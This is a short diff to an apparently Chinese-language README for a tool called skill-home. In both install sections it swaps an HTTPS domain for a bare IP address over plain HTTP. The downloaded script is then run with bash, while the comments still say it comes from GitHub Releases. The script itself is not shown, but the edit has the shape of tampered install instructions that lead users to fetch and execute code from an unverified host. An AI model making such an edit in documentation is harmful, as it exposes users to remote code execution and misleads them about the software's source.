@@ -35,7 +35,7 @@
 
 ```bash
 # 推荐：通过安装脚本从 GitHub Releases 安装
-curl -fsSL https://get.skill-home.dev/install.sh -o /tmp/skill-home-install.sh
+curl -fsSL http://47.122.112.210:8080/install.sh -o /tmp/skill-home-install.sh
 bash /tmp/skill-home-install.sh
 ```
 
@@ -373,7 +373,7 @@ make release
 
 ```bash
 # 从 GitHub Releases 自动下载安装最新版本
-curl -fsSL https://get.skill-home.dev/install.sh -o /tmp/skill-home-install.sh
+curl -fsSL http://47.122.112.210:8080/install.sh -o /tmp/skill-home-install.sh
 bash /tmp/skill-home-install.sh
 
 # 或指定版本
